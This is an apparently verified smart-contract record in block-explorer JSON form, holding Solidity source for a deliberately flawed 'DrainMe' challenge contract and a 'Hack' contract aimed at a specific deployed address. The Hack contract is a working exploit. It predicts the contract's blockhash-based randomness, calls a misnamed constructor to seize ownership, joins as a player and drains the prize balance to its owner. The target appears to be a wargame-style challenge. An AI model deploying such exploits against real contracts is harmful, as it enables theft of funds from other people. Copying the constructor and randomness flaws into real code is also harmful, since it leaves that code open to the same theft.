{"status": "1", "message": "OK", "result": [{"SourceCode": "pragma solidity ^0.4.23;\r\n\r\ncontract DrainMe {  \r\n\r\n//constants\r\n\r\naddress public winner = 0x0;\r\naddress public owner;\r\naddress public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;\r\naddress public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;\r\naddress[] public players;\r\n\r\nmapping(address=>bool) approvedPlayers;\r\n\r\nuint256 public secret;\r\nuint256[] public seed = [951828771,158769871220];\r\nuint256[] public balance;\r\n\r\n//constructor\r\n\r\nfunction DranMe() public payable{\r\n\towner = msg.sender;\r\n}\r\n\r\n//modifiers\r\n\r\nmodifier onlyOwner() {\r\n    require(msg.sender == owner);\r\n    _;\r\n}\r\n\r\nmodifier onlyWinner() {\r\n    require(msg.sender == winner);\r\n    _;\r\n}\r\n\r\nmodifier onlyPlayers() {\r\n    require(approvedPlayers[msg.sender]);\r\n    _;\r\n}\r\n\r\n//functions\r\n\r\nfunction getLength() public constant returns(uint256) {\r\n\treturn seed.length;\r\n}\r\n\r\nfunction setSecret(uint256 _secret) public payable onlyOwner{\r\n\tsecret = _secret;\r\n}\r\n\r\nfunction getPlayerCount() public constant returns(uint256) {\r\n\treturn players.length;\r\n}\r\n\r\nfunction getPrize() public constant returns(uint256) {\r\n\treturn address(this).balance;\r\n}\r\n\r\nfunction becomePlayer() public payable{\r\n\trequire(msg.value >= 0.02 ether);\r\n\tplayers.push(msg.sender);\r\n\tapprovedPlayers[msg.sender]=true;\r\n}\r\n\r\nfunction manipulateSecret() public payable onlyPlayers{\r\n\trequire (msg.value >= 0.01 ether);\r\n\tif(msg.sender!=owner || unlockSecret()){\r\n\t    uint256 amount = 0;\r\n        msg.sender.transfer(amount);\r\n\t}\r\n}\r\n\r\nevent str(uint256);\r\n\r\nfunction unlockSecret() private returns(bool){\r\n    bytes32 hash = keccak256(blockhash(block.number-1));\r\n    \r\n    uint256 secret = uint256(hash);\r\n    str(secret);\r\n        if(secret%5==0){\r\n            winner = msg.sender;\r\n            return true;\r\n        }\r\n        else{\r\n            return false;\r\n        }\r\n    }\r\n\r\nfunction callFirstTarget () public payable onlyPlayers {\r\n\trequire (msg.value >= 0.005 ether);\r\n\tfirstTarget.call.value(msg.value)();\r\n}\r\n\r\nfunction callSecondTarget () public payable onlyPlayers {\r\n\trequire (msg.value >= 0.005 ether);\r\n\tsecondTarget.call.value(msg.value)();\r\n}\r\n\r\nfunction setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {\r\n\tseed[_index] = _value;\r\n}\r\n\t\r\nfunction addSeed (uint256 _add) public payable onlyPlayers {\r\n\tseed.length = _add;\r\n}\r\n\r\nfunction guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {\r\n\treturn (_seed / (seed[0]*seed[1]));\r\n\tif((_seed / (seed[0]*seed[1])) == secret) {\r\n\t\towner = winner;\r\n\t}\r\n}\r\n\r\nfunction checkSecret () public payable onlyPlayers returns(bool) {\r\n    require(msg.value >= 0.01 ether);\r\n    if(msg.value == secret){\r\n        return true;\r\n    }\r\n}\r\n\r\nfunction winPrize() public payable onlyOwner {\r\n\towner.call.value(1 wei)();\r\n}\r\n\r\nfunction claimPrize() public payable onlyWinner {\r\n\twinner.transfer(address(this).balance);\r\n}\r\n\r\n//fallback function\r\n\r\nfunction() public payable{\r\n\t}\r\n}\r\n\r\ncontract Hack{\r\n    \r\n    DrainMe contr = DrainMe(0xB620CeE6B52f96f3C6b253E6eEa556Aa2d214a99);\r\n    \r\n    address owner;\r\n    \r\n    function Hack(){\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    //function put() payable public {\r\n     //   require(msg.sender == owner);\r\n     //   address(contr).transfer(msg.value);\r\n    //}\r\n    \r\n    function putHere() payable public {\r\n        require (msg.value >= 0.03 ether);\r\n        require(msg.sender == owner);\r\n    }\r\n    \r\n    event test1(bool);\r\n    event what(uint256);\r\n    function test() public payable {\r\n        //require (msg.value >= 0.03 ether);\r\n        require(msg.sender == owner);\r\n        bytes32 hash = keccak256(blockhash(block.number-1));\r\n        uint256 secret = uint256(hash);\r\n        what(secret);\r\n        if(secret%5==0){\r\n            contr.DranMe();\r\n            contr.becomePlayer.value(0.02 ether)();\r\n            contr.manipulateSecret.value(0.01 ether)();\r\n            contr.claimPrize();\r\n            msg.sender.transfer(address(this).balance);\r\n            test1(true);\r\n        }\r\n        else{\r\n            test1(false);\r\n        }\r\n        \r\n    }\r\n      \r\n    function take() public {\r\n        require(msg.sender == owner);\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n    \r\n    function() public payable {}\r\n    \r\n    \r\n}", "ABI": "[{\"constant\":false,\"inputs\":[],\"name\":\"take\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"putHere\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"test\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"\",\"type\":\"bool\"}],\"name\":\"test1\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"what\",\"type\":\"event\"}]", "ContractName": "Hack", "CompilerVersion": "v0.4.23+commit.124ca40d", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "Library": "", "SwarmSource": "bzzr://563eff99842af219cef3c087f55cabf64334dc7cf493b274cd162ecf4670c8aa"}]}